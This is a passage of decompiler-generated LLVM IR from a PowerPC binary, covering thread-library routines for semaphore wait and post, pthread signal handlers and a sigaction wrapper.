  uselistorder i32 %v0_10007004, { 4, 5, 9, 8, 3, 6, 7, 0, 1, 10, 2, 12, 11, 13, 14 }
  uselistorder i32* %stack_var_-20, { 1, 0 }
  uselistorder i32* %r30.global-to-local, { 1, 0, 2 }
  uselistorder i32 268464324, { 1, 0 }
  uselistorder label %dec_label_pc_10007134, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_10007130, { 1, 0 }
  uselistorder label %dec_label_pc_100070f4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_100070bc.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_100070d4, { 1, 0 }
  uselistorder label %dec_label_pc_10007094, { 1, 0 }
}

define i32 @new_sem_extricate_func(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r28.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r3, align 4
  %v0_10007154 = load i32, i32* @r2, align 4
  store i32 %arg2, i32* @r29, align 4
  store i32 %v0_10007154, i32* @r4, align 4
  store i32 %arg1, i32* %r28.global-to-local, align 4
  store i32 268464496, i32* @lr, align 4
  %v0_1000716c = call i32 @__pthread_lock()
  %v0_10007170 = load i32, i32* @r29, align 4
  %v1_10007174 = add i32 %arg1, 12
  store i32 %v1_10007174, i32* @r3, align 4
  %v2_10007178 = call i32 @remove_from_queue.6(i32 %v1_10007174, i32 %v0_10007170)
  %v0_10007180 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_10007180, i32* @r3, align 4
  store i32 268464520, i32* @lr, align 4
  %v0_10007184 = call i32 @__pthread_unlock()
  ret i32 %v2_10007178
}

define i32 @sem_timedwait(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r3, align 4
  %stack_var_-40 = alloca i32, align 4
  store i32 %arg2, i32* @r28, align 4
  %v0_100071b4 = load i32, i32* @r2, align 4
  store i32 %v0_100071b4, i32* @r4, align 4
  store i32 268464580, i32* @lr, align 4
  %v0_100071c0 = call i32 @__pthread_lock()
  %v0_100071c4 = load i32, i32* @r30, align 4
  %v1_100071c4 = add i32 %v0_100071c4, 8
  %v2_100071c4 = inttoptr i32 %v1_100071c4 to i32*
  %v3_100071c4 = load i32, i32* %v2_100071c4, align 4
  store i32 %v3_100071c4, i32* %r9.global-to-local, align 4
  %tmp10 = icmp slt i32 %v3_100071c4, 1
  br i1 %tmp10, label %dec_label_pc_100071e4, label %dec_label_pc_100071d0

dec_label_pc_100071d0:                            ; preds = %entry
  %v1_100071d0 = add i32 %v3_100071c4, -1
  store i32 %v0_100071c4, i32* @r3, align 4
  store i32 %v1_100071d0, i32* %v2_100071c4, align 4
  store i32 ptrtoint (i32* @global_var_100071e0.239 to i32), i32* @lr, align 4
  %v0_100071dc = call i32 @__pthread_unlock()
  br label %dec_label_pc_10007348

dec_label_pc_100071e4:                            ; preds = %entry
  %v0_100071e8 = load i32, i32* @r28, align 4
  %v1_100071e8 = add i32 %v0_100071e8, 4
  %v2_100071e8 = inttoptr i32 %v1_100071e8 to i32*
  %v3_100071e8 = load i32, i32* %v2_100071e8, align 4
  store i32 %v3_100071e8, i32* %r9.global-to-local, align 4
  %tmp11 = icmp ult i32 %v3_100071e8, 1000000000
  br i1 %tmp11, label %dec_label_pc_10007210, label %dec_label_pc_100071f8

dec_label_pc_100071f8:                            ; preds = %dec_label_pc_100071e4
  store i32 %v0_100071c4, i32* @r3, align 4
  store i32 268464640, i32* @lr, align 4
  %v0_100071fc = call i32 @__pthread_unlock()
  %v0_10007200 = call i32 @__errno_location()
  br label %dec_label_pc_10007340

dec_label_pc_10007210:                            ; preds = %dec_label_pc_100071e4
  store i32 268464460, i32* %r9.global-to-local, align 4
  store i32 %v0_100071c4, i32* %stack_var_-40, align 4
  %v0_10007224 = load i32, i32* @r31, align 4
  %v3_10007228 = add i32 %v0_10007224, 442
  %v4_10007228 = inttoptr i32 %v3_10007228 to i8*
  store i8 0, i8* %v4_10007228, align 1
  %v2_1000722c = ptrtoint i32* %stack_var_-40 to i32
  store i32 268464692, i32* @lr, align 4
  %v2_10007230 = call i32 @__pthread_set_own_extricate_if.7(i32 %v0_10007224, i32 %v2_1000722c)
  %v0_10007234 = load i32, i32* @r31, align 4
  %v1_10007234 = add i32 %v0_10007234, 66
  %v2_10007234 = inttoptr i32 %v1_10007234 to i8*
  %v3_10007234 = load i8, i8* %v2_10007234, align 1
  %v3_10007238 = icmp eq i8 %v3_10007234, 0
  br i1 %v3_10007238, label %dec_label_pc_10007250, label %dec_label_pc_10007240

dec_label_pc_10007240:                            ; preds = %dec_label_pc_10007210
  %v1_10007240 = add i32 %v0_10007234, 64
  %v2_10007240 = inttoptr i32 %v1_10007240 to i8*
  %v3_10007240 = load i8, i8* %v2_10007240, align 1
  store i32 1, i32* @r29, align 4
  %v3_10007248 = icmp eq i8 %v3_10007240, 0
  br i1 %v3_10007248, label %dec_label_pc_10007260, label %dec_label_pc_10007250

dec_label_pc_10007250:                            ; preds = %dec_label_pc_10007240, %dec_label_pc_10007210
  %v0_10007250 = load i32, i32* @r30, align 4
  %v1_10007250 = add i32 %v0_10007250, 12
  %v2_10007258 = call i32 @enqueue.5(i32 %v1_10007250, i32 %v0_10007234)
  store i32 0, i32* @r29, align 4
  br label %dec_label_pc_10007260

dec_label_pc_10007260:                            ; preds = %dec_label_pc_10007240, %dec_label_pc_10007250
  %v0_10007260 = load i32, i32* @r30, align 4
  store i32 %v0_10007260, i32* @r3, align 4
  store i32 268464744, i32* @lr, align 4
  %v0_10007264 = call i32 @__pthread_unlock()
  %v0_10007268 = load i32, i32* @r29, align 4
  %v3_10007268 = icmp eq i32 %v0_10007268, 0
  %v0_10007288.pre = load i32, i32* @r31, align 4
  br i1 %v3_10007268, label %dec_label_pc_10007288, label %dec_label_pc_10007270

dec_label_pc_10007270:                            ; preds = %dec_label_pc_10007260
  store i32 268464764, i32* @lr, align 4
  %v2_10007278 = call i32 @__pthread_set_own_extricate_if.7(i32 %v0_10007288.pre, i32 0)
  br label %dec_label_pc_10007324

dec_label_pc_10007288:                            ; preds = %dec_label_pc_100072e8, %dec_label_pc_100072dc, %dec_label_pc_10007260
  %v0_10007288 = phi i32 [ %v0_10007288.pre, %dec_label_pc_10007260 ], [ %v0_100072d0, %dec_label_pc_100072dc ], [ %v0_100072d0, %dec_label_pc_100072e8 ]
  %v0_1000728c = load i32, i32* @r28, align 4
  store i32 268464788, i32* @lr, align 4
  %v2_10007290 = inttoptr i32 %v0_1000728c to i32*
  %v3_10007290 = call i32 @__pthread_timedsuspend_new(i32 %v0_10007288, i32* %v2_10007290)
  %v3_10007294 = icmp eq i32 %v3_10007290, 0
  br i1 %v3_10007294, label %dec_label_pc_1000729c, label %dec_label_pc_100072d0

dec_label_pc_1000729c:                            ; preds = %dec_label_pc_10007288
  %v0_1000729c = load i32, i32* @r30, align 4
  store i32 %v0_1000729c, i32* @r3, align 4
  %v0_100072a0 = load i32, i32* @r31, align 4
  store i32 %v0_100072a0, i32* @r4, align 4
  store i32 268464808, i32* @lr, align 4
  %v0_100072a4 = call i32 @__pthread_lock()
  %v0_100072a8 = load i32, i32* @r31, align 4
  %v0_100072ac = load i32, i32* @r30, align 4
  %v1_100072ac = add i32 %v0_100072ac, 12
  store i32 %v1_100072ac, i32* @r3, align 4
  %v2_100072b0 = call i32 @remove_from_queue.6(i32 %v1_100072ac, i32 %v0_100072a8)
  %v0_100072b8 = load i32, i32* @r30, align 4
  store i32 %v0_100072b8, i32* @r3, align 4
  store i32 268464832, i32* @lr, align 4
  %v0_100072bc = call i32 @__pthread_unlock()
  %v3_100072c0 = icmp eq i32 %v2_100072b0, 0
  br i1 %v3_100072c0, label %dec_label_pc_100072c8, label %dec_label_pc_10007328

dec_label_pc_100072c8:                            ; preds = %dec_label_pc_1000729c
  %v0_100072c8 = load i32, i32* @r31, align 4
  store i32 %v0_100072c8, i32* @r3, align 4
  store i32 268464848, i32* @lr, align 4
  %v1_100072cc = call i32 @suspend.8(i32 %v0_100072c8)
  br label %dec_label_pc_100072d0

dec_label_pc_100072d0:                            ; preds = %dec_label_pc_10007288, %dec_label_pc_100072c8
  %v0_100072d0 = load i32, i32* @r31, align 4
  %v1_100072d0 = add i32 %v0_100072d0, 442
  %v2_100072d0 = inttoptr i32 %v1_100072d0 to i8*
  %v3_100072d0 = load i8, i8* %v2_100072d0, align 1
  %v3_100072d4 = icmp eq i8 %v3_100072d0, 0
  br i1 %v3_100072d4, label %dec_label_pc_100072dc, label %dec_label_pc_100072f4

dec_label_pc_100072dc:                            ; preds = %dec_label_pc_100072d0
  %v1_100072dc = add i32 %v0_100072d0, 440
  %v2_100072dc = inttoptr i32 %v1_100072dc to i8*
  %v3_100072dc = load i8, i8* %v2_100072dc, align 1
  %v3_100072e0 = icmp eq i8 %v3_100072dc, 0
  br i1 %v3_100072e0, label %dec_label_pc_10007288, label %dec_label_pc_100072e8

dec_label_pc_100072e8:                            ; preds = %dec_label_pc_100072dc
  %v1_100072e8 = add i32 %v0_100072d0, 64
  %v2_100072e8 = inttoptr i32 %v1_100072e8 to i8*
  %v3_100072e8 = load i8, i8* %v2_100072e8, align 1
  %v3_100072ec = icmp eq i8 %v3_100072e8, 0
  br i1 %v3_100072ec, label %dec_label_pc_100072f4, label %dec_label_pc_10007288

dec_label_pc_100072f4:                            ; preds = %dec_label_pc_100072e8, %dec_label_pc_100072d0
  store i32 268464896, i32* @lr, align 4
  %v2_100072fc = call i32 @__pthread_set_own_extricate_if.7(i32 %v0_100072d0, i32 0)
  %v0_10007300 = load i32, i32* @r31, align 4
  %v1_10007300 = add i32 %v0_10007300, 440
  %v2_10007300 = inttoptr i32 %v1_10007300 to i8*
  %v3_10007300 = load i8, i8* %v2_10007300, align 1
  %v3_10007304 = icmp eq i8 %v3_10007300, 0
  br i1 %v3_10007304, label %dec_label_pc_10007348, label %dec_label_pc_1000730c

dec_label_pc_1000730c:                            ; preds = %dec_label_pc_100072f4
  %v1_1000730c = add i32 %v0_10007300, 64
  %v2_1000730c = inttoptr i32 %v1_1000730c to i8*
  %v3_1000730c = load i8, i8* %v2_1000730c, align 1
  %v3_10007310 = icmp eq i8 %v3_1000730c, 0
  br i1 %v3_10007310, label %dec_label_pc_10007318, label %dec_label_pc_10007348

dec_label_pc_10007318:                            ; preds = %dec_label_pc_1000730c
  store i8 0, i8* %v2_10007300, align 1
  br label %dec_label_pc_10007324

dec_label_pc_10007324:                            ; preds = %dec_label_pc_10007270, %dec_label_pc_10007318
  %v0_10007324 = call i32 @__pthread_do_exit()
  br label %dec_label_pc_10007328

dec_label_pc_10007328:                            ; preds = %dec_label_pc_1000729c, %dec_label_pc_10007324
  %v0_10007328 = load i32, i32* @r31, align 4
  store i32 268464948, i32* @lr, align 4
  %v2_10007330 = call i32 @__pthread_set_own_extricate_if.7(i32 %v0_10007328, i32 0)
  %v0_10007334 = call i32 @__errno_location()
  br label %dec_label_pc_10007340

dec_label_pc_10007340:                            ; preds = %dec_label_pc_100071f8, %dec_label_pc_10007328
  %storemerge2 = phi i32 [ %v0_10007200, %dec_label_pc_100071f8 ], [ %v0_10007334, %dec_label_pc_10007328 ]
  %storemerge = phi i32 [ 22, %dec_label_pc_100071f8 ], [ 110, %dec_label_pc_10007328 ]
  store i32 -1, i32* %r9.global-to-local, align 4
  %v2_10007340 = inttoptr i32 %storemerge2 to i32*
  store i32 %storemerge, i32* %v2_10007340, align 4
  %v0_10007350.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000734c

dec_label_pc_10007348:                            ; preds = %dec_label_pc_1000730c, %dec_label_pc_100072f4, %dec_label_pc_100071d0
  store i32 0, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000734c

dec_label_pc_1000734c:                            ; preds = %dec_label_pc_10007340, %dec_label_pc_10007348
  %v0_10007350 = phi i32 [ %v0_10007350.pre, %dec_label_pc_10007340 ], [ 0, %dec_label_pc_10007348 ]
  ret i32 %v0_10007350

; uselistorder directives
  uselistorder i32 %v0_100072d0, { 2, 3, 4, 5, 1, 0 }
  uselistorder i32* %stack_var_-40, { 1, 0 }
  uselistorder i32* %r9.global-to-local, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32 110, { 1, 2, 0 }
  uselistorder i32 ()* @__pthread_do_exit, { 9, 8, 11, 7, 2, 3, 6, 5, 1, 4, 0, 10 }
  uselistorder i32 440, { 0, 1, 2, 6, 5, 3, 4 }
  uselistorder i32 (i32)* @suspend.8, { 2, 1, 0 }
  uselistorder i32 (i32, i32)* @enqueue.5, { 1, 0 }
  uselistorder i32 (i32, i32)* @__pthread_set_own_extricate_if.7, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_1000734c, { 1, 0 }
  uselistorder label %dec_label_pc_10007340, { 1, 0 }
  uselistorder label %dec_label_pc_10007328, { 1, 0 }
  uselistorder label %dec_label_pc_10007324, { 1, 0 }
  uselistorder label %dec_label_pc_100072d0, { 1, 0 }
  uselistorder label %dec_label_pc_10007260, { 1, 0 }
}

define i32 @__new_sem_post(i32 %arg1) local_unnamed_addr {
entry:
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r3, align 4
  %stack_var_-184 = alloca i32, align 4
  %v0_1000736c = load i32, i32* @r2, align 4
  store i32 %v0_1000736c, i32* @r4, align 4
  %v1_1000737c = add i32 %v0_1000736c, 84
  %v2_1000737c = inttoptr i32 %v1_1000737c to i32*
  %v3_1000737c = load i32, i32* %v2_1000737c, align 4
  store i32 %v3_1000737c, i32* @r29, align 4
  %v3_10007380 = icmp eq i32 %v3_1000737c, 0
  br i1 %v3_10007380, label %dec_label_pc_10007388, label %dec_label_pc_10007404

dec_label_pc_10007388:                            ; preds = %entry
  store i32 268465036, i32* @lr, align 4
  %v0_10007388 = call i32 @__pthread_lock()
  %v0_1000738c = load i32, i32* @r30, align 4
  %v1_1000738c = add i32 %v0_1000738c, 12
  %v2_1000738c = inttoptr i32 %v1_1000738c to i32*
  %v3_1000738c = load i32, i32* %v2_1000738c, align 4
  store i32 %v3_1000738c, i32* @r31, align 4
  %v3_10007390 = icmp eq i32 %v3_1000738c, 0
  br i1 %v3_10007390, label %dec_label_pc_10007398, label %dec_label_pc_100073d8

dec_label_pc_10007398:                            ; preds = %dec_label_pc_10007388
  %v1_10007398 = add i32 %v0_1000738c, 8
  %v2_10007398 = inttoptr i32 %v1_10007398 to i32*
  %v3_10007398 = load i32, i32* %v2_10007398, align 4
  store i32 %v3_10007398, i32* %r9.global-to-local, align 4
  %v3_100073a0 = icmp eq i32 %v3_10007398, 2147483647
  br i1 %v3_100073a0, label %dec_label_pc_100073a8, label %dec_label_pc_100073c4

dec_label_pc_100073a8:                            ; preds = %dec_label_pc_10007398
  %v0_100073a8 = call i32 @__errno_location()
  %v2_100073b0 = inttoptr i32 %v0_100073a8 to i32*
  store i32 34, i32* %v2_100073b0, align 4
  %v0_100073b4 = load i32, i32* @r30, align 4
  store i32 %v0_100073b4, i32* @r3, align 4
  store i32 268465084, i32* @lr, align 4
  %v0_100073b8 = call i32 @__pthread_unlock()
  store i32 -1, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10007470

dec_label_pc_100073c4:                            ; preds = %dec_label_pc_10007398
  %v1_100073c4 = add i32 %v3_10007398, 1
  store i32 %v0_1000738c, i32* @r3, align 4
  store i32 %v1_100073c4, i32* %v2_10007398, align 4
  store i32 ptrtoint (i32* @global_var_100073d4.241 to i32), i32* @lr, align 4
  %v0_100073d0 = call i32 @__pthread_unlock()
  br label %dec_label_pc_1000746c

dec_label_pc_100073d8:                            ; preds = %dec_label_pc_10007388
  %v1_100073d8 = add i32 %v3_1000738c, 8
  %v2_100073d8 = inttoptr i32 %v1_100073d8 to i32*
  %v3_100073d8 = load i32, i32* %v2_100073d8, align 4
  store i32 %v0_1000738c, i32* @r3, align 4
  store i32 %v3_100073d8, i32* %v2_1000738c, align 4
  %v0_100073e4 = load i32, i32* @r29, align 4
  %v1_100073e4 = load i32, i32* @r31, align 4
  %v2_100073e4 = add i32 %v1_100073e4, 8
  %v3_100073e4 = inttoptr i32 %v2_100073e4 to i32*
  store i32 %v0_100073e4, i32* %v3_100073e4, align 4
  store i32 ptrtoint (i32* @global_var_100073ec.242 to i32), i32* @lr, align 4
  %v0_100073e8 = call i32 @__pthread_unlock()
  %v2_100073f0 = load i32, i32* @r31, align 4
  %v3_100073f0 = add i32 %v2_100073f0, 442
  %v4_100073f0 = inttoptr i32 %v3_100073f0 to i8*
  store i8 1, i8* %v4_100073f0, align 1
  %v0_100073f8 = load i32, i32* @r31, align 4
  store i32 %v0_100073f8, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_10007400.243 to i32), i32* @lr, align 4
  %v0_100073fc = call i32 @__pthread_restart_new()
  br label %dec_label_pc_1000746c

dec_label_pc_10007404:                            ; preds = %entry
  store i32 ptrtoint (i32* @global_var_10030000.11 to i32), i32* %r9.global-to-local, align 4
  %v3_10007408 = load i32, i32* @global_var_1002c258.128, align 4
  %tmp7 = icmp sgt i32 %v3_10007408, -1
  br i1 %tmp7, label %dec_label_pc_10007434, label %dec_label_pc_10007414

dec_label_pc_10007414:                            ; preds = %dec_label_pc_10007404
  store i32 268465176, i32* @lr, align 4
  %v2_10007414 = call i32 @__pthread_initialize_manager(i32 %v0_1000736c)
  %tmp8 = icmp sgt i32 %v2_10007414, -1
  br i1 %tmp8, label %dec_label_pc_10007434, label %dec_label_pc_10007420

dec_label_pc_10007420:                            ; preds = %dec_label_pc_10007414
  %v0_10007420 = call i32 @__errno_location()
  store i32 -1, i32* %r9.global-to-local, align 4
  %v2_1000742c = inttoptr i32 %v0_10007420 to i32*
  store i32 11, i32* %v2_1000742c, align 4
  %v0_10007474.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10007470

dec_label_pc_10007434:                            ; preds = %dec_label_pc_10007414, %dec_label_pc_10007404
  %v2_10007444 = ptrtoint i32* %stack_var_-184 to i32
  br label %dec_label_pc_10007440

dec_label_pc_10007440:                            ; preds = %dec_label_pc_1000745c, %dec_label_pc_10007434
  store i32 ptrtoint (i32* @global_var_10030000.11 to i32), i32* %r9.global-to-local, align 4
  %v3_10007448 = load i32, i32* @global_var_1002c258.128, align 4
  store i32 268465236, i32* @lr, align 4
  %v2_10007450 = call i32 @__libc_write(i32 %v3_10007448, i32 %v2_10007444)
  %v3_10007454 = icmp eq i32 %v2_10007450, -1
  br i1 %v3_10007454, label %dec_label_pc_1000745c, label %dec_label_pc_1000746c

dec_label_pc_1000745c:                            ; preds = %dec_label_pc_10007440
  %v0_1000745c = call i32 @__errno_location()
  %v1_10007460 = inttoptr i32 %v0_1000745c to i32*
  %v2_10007460 = load i32, i32* %v1_10007460, align 4
  %v3_10007464 = icmp eq i32 %v2_10007460, 4
  br i1 %v3_10007464, label %dec_label_pc_10007440, label %dec_label_pc_1000746c

dec_label_pc_1000746c:                            ; preds = %dec_label_pc_10007440, %dec_label_pc_1000745c, %dec_label_pc_100073d8, %dec_label_pc_100073c4
  store i32 0, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10007470

dec_label_pc_10007470:                            ; preds = %dec_label_pc_10007420, %dec_label_pc_100073a8, %dec_label_pc_1000746c
  %v0_10007474 = phi i32 [ %v0_10007474.pre, %dec_label_pc_10007420 ], [ -1, %dec_label_pc_100073a8 ], [ 0, %dec_label_pc_1000746c ]
  ret i32 %v0_10007474

; uselistorder directives
  uselistorder i32 %v3_10007398, { 1, 0, 2 }
  uselistorder i32 %v0_1000738c, { 2, 0, 1, 3 }
  uselistorder i32 %v0_1000736c, { 1, 0, 2 }
  uselistorder i32 (i32)* @__pthread_initialize_manager, { 1, 0 }
  uselistorder label %dec_label_pc_10007470, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000746c, { 1, 0, 2, 3 }
}

define i32 @pthread_sighandler_rt(i32 %arg1) local_unnamed_addr {
entry:
  %cr4_eq.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v0_10007488 = load i32, i32* @lr, align 4
  store i32 %v0_10007488, i32* %r0.global-to-local, align 4
  %v4_1000748c = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_1000748c, i32* %stack_var_-32, align 4
  %v5_1000748c = ptrtoint i32* %stack_var_-32 to i32
  %v0_10007490 = call i32 @__asm_mfcr()
  %v1_10007494 = mul i32 %v0_10007490, 4
  store i32 %v1_10007494, i32* %r11.global-to-local, align 4
  %v0_1000749c = load i32, i32* @r2, align 4
  store i32 %v0_1000749c, i32* %r31.global-to-local, align 4
  %v0_100074a0 = load i32, i32* %r0.global-to-local, align 4
  %v1_100074a8 = add i32 %v0_1000749c, 88
  %v2_100074a8 = inttoptr i32 %v1_100074a8 to i8*
  %v3_100074a8 = load i8, i8* %v2_100074a8, align 1
  %v4_100074a8 = zext i8 %v3_100074a8 to i32
  store i32 %v4_100074a8, i32* %r0.global-to-local, align 4
  %v3_100074ac = icmp eq i8 %v3_100074a8, 0
  br i1 %v3_100074ac, label %dec_label_pc_100074c4, label %dec_label_pc_100074b4

dec_label_pc_100074b4:                            ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_100074b8 = add i32 %v0_1000749c, 32
  %v3_100074b8 = inttoptr i32 %v2_100074b8 to i32*
  store i32 %v0_10007490, i32* %v3_100074b8, align 4
  %v0_100074bc = load i32, i32* %r0.global-to-local, align 4
  %v1_100074bc = trunc i32 %v0_100074bc to i8
  %v2_100074bc = load i32, i32* @r2, align 4
  %v3_100074bc = add i32 %v2_100074bc, 88
  %v4_100074bc = inttoptr i32 %v3_100074bc to i8*
  store i8 %v1_100074bc, i8* %v4_100074bc, align 1
  br label %dec_label_pc_100074f0

dec_label_pc_100074c4:                            ; preds = %entry
  %v1_100074c4 = add i32 %v0_1000749c, 84
  %v2_100074c4 = inttoptr i32 %v1_100074c4 to i32*
  %v3_100074c4 = load i32, i32* %v2_100074c4, align 4
  store i32 %v3_100074c4, i32* %r30.global-to-local, align 4
  %v3_100074c8 = icmp eq i32 %v3_100074c4, 0
  store i1 %v3_100074c8, i1* %cr4_eq.global-to-local, align 1
  br i1 %v3_100074c8, label %dec_label_pc_100074d0, label %dec_label_pc_100074d4

dec_label_pc_100074d0:                            ; preds = %dec_label_pc_100074c4
  store i32 %v5_1000748c, i32* %v2_100074c4, align 4
  %v0_100074dc.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_100074d4

dec_label_pc_100074d4:                            ; preds = %dec_label_pc_100074c4, %dec_label_pc_100074d0
  %v0_100074dc = phi i32 [ %v1_10007494, %dec_label_pc_100074c4 ], [ %v0_100074dc.pre, %dec_label_pc_100074d0 ]
  %v2_100074dc = add i32 %v0_100074dc, ptrtoint (i32* @global_var_1002c850.245 to i32)
  %v3_100074dc = inttoptr i32 %v2_100074dc to i32*
  %v4_100074dc = load i32, i32* %v3_100074dc, align 4
  store i32 %v4_100074dc, i32* %r11.global-to-local, align 4
  call void @__pseudo_call(i32 %v4_100074dc)
  %v0_100074e8 = load i1, i1* %cr4_eq.global-to-local, align 1
  br i1 %v0_100074e8, label %dec_label_pc_100074ec, label %dec_label_pc_100074f0

dec_label_pc_100074ec:                            ; preds = %dec_label_pc_100074d4
  %v0_100074ec = load i32, i32* %r30.global-to-local, align 4
  %v1_100074ec = load i32, i32* %r31.global-to-local, align 4
  %v2_100074ec = add i32 %v1_100074ec, 84
  %v3_100074ec = inttoptr i32 %v2_100074ec to i32*
  store i32 %v0_100074ec, i32* %v3_100074ec, align 4
  br label %dec_label_pc_100074f0

dec_label_pc_100074f0:                            ; preds = %dec_label_pc_100074d4, %dec_label_pc_100074b4, %dec_label_pc_100074ec
  store i32 %v0_100074a0, i32* %r0.global-to-local, align 4
  %v1_10007500 = call %0 @__asm_mtcrf(i32 8, i32 %v0_10007490)
  ret i32 %v0_10007490

; uselistorder directives
  uselistorder i32 %v1_10007494, { 1, 0 }
  uselistorder i32 %v0_10007490, { 3, 1, 2, 0 }
  uselistorder i32* %stack_var_-32, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 2, 3, 1, 4, 5 }
  uselistorder label %dec_label_pc_100074f0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_100074d4, { 1, 0 }
}

define i32 @pthread_null_sighandler() local_unnamed_addr {
entry:
  %v0_1000750c = load i32, i32* @r3, align 4
  ret i32 %v0_1000750c
}

define i32 @__GI_sigaction(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* @r4, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %stack_var_-168 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_10030000.11 to i32), i32* @r9, align 4
  store i32 %arg1, i32* @r31, align 4
  store i32 %arg3, i32* @r28, align 4
  store i32 %tmp, i32* @r30, align 4
  %v3_10007530 = load i32, i32* @global_var_1002c278.125, align 4
  %v4_10007534 = icmp eq i32 %v3_10007530, %arg1
  br i1 %v4_10007534, label %dec_label_pc_10007638, label %dec_label_pc_1000753c

dec_label_pc_1000753c:                            ; preds = %entry
  store i32 ptrtoint (i32* @global_var_10030000.11 to i32), i32* @r9, align 4
  %v3_10007540 = load i32, i32* @global_var_1002c27c.137, align 4
  %v4_10007544 = icmp eq i32 %v3_10007540, %arg1
  br i1 %v4_10007544, label %dec_label_pc_10007638, label %dec_label_pc_1000754c

dec_label_pc_1000754c:                            ; preds = %dec_label_pc_1000753c
  store i32 ptrtoint (i32* @global_var_10030000.11 to i32), i32* @r9, align 4
  %v3_10007550 = load i32, i32* @global_var_1002c280.138, align 4
  %v4_10007554 = icmp eq i32 %v3_10007550, %arg1
  br i1 %v4_10007554, label %dec_label_pc_1000755c, label %dec_label_pc_10007564

dec_label_pc_1000755c:                            ; preds = %dec_label_pc_1000754c
  %v2_1000755c = icmp sgt i32 %arg1, 0
  br i1 %v2_1000755c, label %dec_label_pc_10007638, label %dec_label_pc_10007564

dec_label_pc_10007564:                            ; preds = %dec_label_pc_1000754c, %dec_label_pc_1000755c
  %v3_10007564 = icmp eq i32* %arg2, null
  store i32 0, i32* %r3.global-to-local, align 4
  br i1 %v3_10007564, label %dec_label_pc_100075d0, label %dec_label_pc_10007570

dec_label_pc_10007570:                            ; preds = %dec_label_pc_10007564
  %v2_10007570 = ptrtoint i32* %stack_var_-168 to i32
  store i32 140, i32* @r5, align 4
  store i32 %v2_10007570, i32* @r3, align 4
  store i32 268465536, i32* @lr, align 4
  %v0_1000757c = call i32 @memcpy()
  store i32 %v0_1000757c, i32* %r3.global-to-local, align 4
  %v0_10007580 = load i32, i32* @r30, align 4
  %v1_10007580 = inttoptr i32 %v0_10007580 to i32*
  %v2_10007580 = load i32, i32* %v1_10007580, align 4
  %tmp10 = or i32 %v2_10007580, 1
  %tmp11 = icmp eq i32 %tmp10, 1
  %v0_100075d8.pre.pre = load i32, i32* @r31, align 4
  br i1 %tmp11, label %dec_label_pc_100075cc, label %dec_label_pc_1000758c

dec_label_pc_1000758c:                            ; preds = %dec_label_pc_10007570
  %tmp12 = icmp slt i32 %v0_100075d8.pre.pre, 1
  br i1 %tmp12, label %dec_label_pc_100075cc, label %dec_label_pc_10007594

dec_label_pc_10007594:                            ; preds = %dec_label_pc_1000758c
  %v2_10007594 = icmp sgt i32 %v0_100075d8.pre.pre, 64
  br i1 %v2_10007594, label %dec_label_pc_100075cc, label %dec_label_pc_1000759c

dec_label_pc_1000759c:                            ; preds = %dec_label_pc_10007594
  %v1_1000759c = add i32 %v0_10007580, 132
  %v2_1000759c = inttoptr i32 %v1_1000759c to i32*
  %v3_1000759c = load i32, i32* %v2_1000759c, align 4
  %v1_100075a0 = and i32 %v3_1000759c, 4
  %v3_100075a0 = icmp eq i32 %v1_100075a0, 0
  %. = select i1 %v3_100075a0, i32 268466196, i32 268465288
  store i32 %v2_10007570, i32* %r3.global-to-local, align 4
  store i32 %., i32* %stack_var_-168, align 4
  br label %dec_label_pc_100075d0

dec_label_pc_100075cc:                            ; preds = %dec_label_pc_10007570, %dec_label_pc_10007594, %dec_label_pc_1000758c
  store i32 %v2_10007570, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100075d0

dec_label_pc_100075d0:                            ; preds = %dec_label_pc_10007564, %dec_label_pc_1000759c, %dec_label_pc_100075cc
  %v0_100075d8 = phi i32 [ %arg1, %dec_label_pc_10007564 ], [ %v0_100075d8.pre.pre, %dec_label_pc_1000759c ], [ %v0_100075d8.pre.pre, %dec_label_pc_100075cc ]
  %v0_100075d0 = phi i32 [ 0, %dec_label_pc_10007564 ], [ %v2_10007570, %dec_label_pc_1000759c ], [ %v2_10007570, %dec_label_pc_100075cc ]
  %v0_100075d4 = load i32, i32* @r28, align 4
  store i32 %v0_100075d8, i32* %r3.global-to-local, align 4
  store i32 268465632, i32* @lr, align 4
  %v3_100075dc = inttoptr i32 %v0_100075d0 to i32*
  %v4_100075dc = call i32 @__libc_sigaction(i32 %v0_100075d8, i32* %v3_100075dc, i32 %v0_100075d4)
  %v3_100075e0 = icmp eq i32 %v4_100075dc, -1
  store i32 -1, i32* %r3.global-to-local, align 4
  br i1 %v3_100075e0, label %dec_label_pc_10007644, label %dec_label_pc_100075ec

dec_label_pc_100075ec:                            ; preds = %dec_label_pc_100075d0
  %v0_100075ec = load i32, i32* @r31, align 4
